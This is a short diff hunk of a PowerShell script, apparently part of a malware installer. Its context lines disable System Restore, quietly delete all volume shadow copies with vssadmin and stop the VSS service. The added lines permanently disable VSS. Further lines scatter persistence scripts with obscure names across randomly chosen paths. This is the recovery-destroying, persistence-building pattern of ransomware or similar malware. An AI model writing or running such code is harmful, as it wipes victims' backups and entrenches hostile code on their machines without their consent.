@@ -64,6 +64,9 @@ $ownership = @(
 Disable-ComputerRestore -Drive "$env:systemdrive\"
 vssadmin delete shadows /for=$env:systemdrive /all /quiet | Out-Null
 net stop vss
+sc.exe config vss start= disabled
+Get-Service vss | Select-Object Status, StartType # debug purpose
+
 $initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
 $initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
